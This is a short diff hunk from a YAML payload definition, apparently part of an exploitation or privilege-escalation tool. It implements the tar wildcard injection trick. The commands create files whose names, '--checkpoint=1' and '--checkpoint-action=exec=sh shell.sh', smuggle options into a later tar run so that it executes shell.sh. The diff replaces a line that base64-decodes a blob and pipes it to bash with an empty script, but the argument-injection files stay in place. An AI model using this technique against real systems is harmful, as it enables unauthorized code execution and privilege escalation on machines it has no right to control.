@@ -518,7 +518,7 @@ payload:
     - |
       touch -- "--checkpoint=1"
       touch -- "--checkpoint-action=exec=sh shell.sh"
-      echo "echo {BASE64} | base64 -d | bash" > shell.sh
+      echo "" > shell.sh
       chmod 777 ./"--checkpoint=1"
       chmod 777 ./"--checkpoint-action=exec=sh shell.sh"
       chmod 777 shell.sh
